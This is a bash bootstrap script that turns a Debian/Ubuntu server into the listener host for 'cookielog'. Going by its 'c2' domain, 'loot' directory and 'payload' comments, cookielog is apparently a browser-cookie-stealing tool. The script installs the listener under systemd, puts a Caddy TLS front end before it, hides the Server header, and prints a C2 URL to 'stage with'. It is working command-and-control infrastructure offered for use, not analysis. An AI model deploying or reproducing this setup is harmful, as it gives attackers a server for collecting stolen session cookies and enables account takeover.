#!/usr/bin/env bash
# deploy/vps/bootstrap.sh -- Debian/Ubuntu listener host for cookielog.
#
#   ./deploy/vps/bootstrap.sh c2.example.com
#   ./deploy/vps/bootstrap.sh c2.example.com --plain
#
# What it does:
#   1. installs python3 + venv + Caddy (official repo)
#   2. copies this checkout to /opt/cookielog, creates a venv, installs deps
#   3. runs listen.py under systemd, bound to 127.0.0.1
#   4. terminates TLS with Caddy on 80/443 -- no cert files to renew by hand
#
# --plain is legacy: binds the listener to 0.0.0.0 and opens TCP 9415 for a
# build that only speaks plain HTTP. The current payload does TLS 1.2 itself,
# so the default shape (listener on loopback, Caddy on 443) needs no extra port.
#
# DNS: point an A/AAAA record at this host before running, or Caddy cannot
# issue the certificate. The script still finishes and retries on its own.
set -euo pipefail

DOMAIN="${1:-}"
PLAIN=0
[[ "${2:-}" == "--plain" ]] && PLAIN=1
BIND=127.0.0.1
[[ $PLAIN -eq 1 ]] && BIND=0.0.0.0

if [[ -z "$DOMAIN" ]]; then
    echo "usage: $0 c2.example.com [--plain]" >&2
    exit 1
fi
if [[ $EUID -ne 0 ]]; then
    echo "run as root" >&2
    exit 1
fi

APP=/opt/cookielog
SVC_USER=cklog
PORT=9415
SRC="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"

echo "[1/6] packages"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq python3 python3-venv python3-pip rsync curl gpg ca-certificates

if ! command -v caddy >/dev/null 2>&1; then
    echo "[2/6] caddy repo"
    curl -1sLf https://dl.cloudsmith.io/public/caddy/stable/gpg.key \
        | gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
    curl -1sLf https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt \
        > /etc/apt/sources.list.d/caddy-stable.list
    apt-get update -qq
    apt-get install -y -qq caddy
else
    echo "[2/6] caddy already installed"
fi

echo "[3/6] service user + tree"
id -u "$SVC_USER" >/dev/null 2>&1 || \
    useradd --system --home "$APP" --shell /usr/sbin/nologin "$SVC_USER"
install -d -o "$SVC_USER" -g "$SVC_USER" -m 750 "$APP"
rsync -a --delete \
    --exclude .git --exclude loot --exclude ifec --exclude __pycache__ \
    "$SRC"/ "$APP"/
install -d -o "$SVC_USER" -g "$SVC_USER" -m 700 "$APP/loot"

echo "[4/6] python venv"
python3 -m venv "$APP/venv"
"$APP/venv/bin/pip" install -q --disable-pip-version-check -r "$APP/requirements.txt"
chown -R "$SVC_USER:$SVC_USER" "$APP"
chmod 750 "$APP"

echo "[5/6] systemd + caddy"
cat > /etc/systemd/system/cklog-listener.service <<EOF
[Unit]
Description=cookielog listener
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$SVC_USER
Group=$SVC_USER
WorkingDirectory=$APP
Environment=PYTHONUNBUFFERED=1
Environment=PYTHONDONTWRITEBYTECODE=1
ExecStart=$APP/venv/bin/python $APP/listen.py $PORT --bind $BIND
Restart=always
RestartSec=3
UMask=0077
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$APP/loot
LimitNOFILE=4096

[Install]
WantedBy=multi-user.target
EOF

install -d -o caddy -g caddy -m 750 /var/log/caddy
cat > /etc/caddy/Caddyfile <<EOF
$DOMAIN {
    encode zstd gzip
    reverse_proxy 127.0.0.1:$PORT
    header -Server
    log {
        output file /var/log/caddy/cklog-access.log
        format json
    }
}
EOF

systemctl daemon-reload
systemctl enable --now cklog-listener
systemctl enable caddy
systemctl restart caddy

if command -v ufw >/dev/null 2>&1 && ufw status | grep -q "Status: active"; then
    echo "[*] ufw: allowing 80/443"
    ufw allow 80/tcp  >/dev/null
    ufw allow 443/tcp >/dev/null
    if [[ $PLAIN -eq 1 ]]; then
        echo "[*] ufw: allowing $PORT/tcp (plain payload)"
        ufw allow "$PORT"/tcp >/dev/null
    fi
fi

echo "[6/6] health"
ok=0
for _ in $(seq 1 15); do
    if curl -fsS --max-time 4 "https://$DOMAIN/health" >/dev/null 2>&1; then
        ok=1
        break
    fi
    sleep 2
done

echo
if [[ $ok -eq 1 ]]; then
    echo "listener: https://$DOMAIN/health"
else
    echo "listener started, but https://$DOMAIN/health did not answer yet."
    echo "check DNS for $DOMAIN, then: systemctl status caddy cklog-listener"
fi
echo "loot:     $APP/loot"
echo "logs:     journalctl -u cklog-listener -f"
if [[ $PLAIN -eq 1 ]]; then
    echo "plain:    http://$DOMAIN:$PORT/   (legacy payload, no TLS)"
else
    echo "c2:       https://$DOMAIN/         (stage with this)"
fi
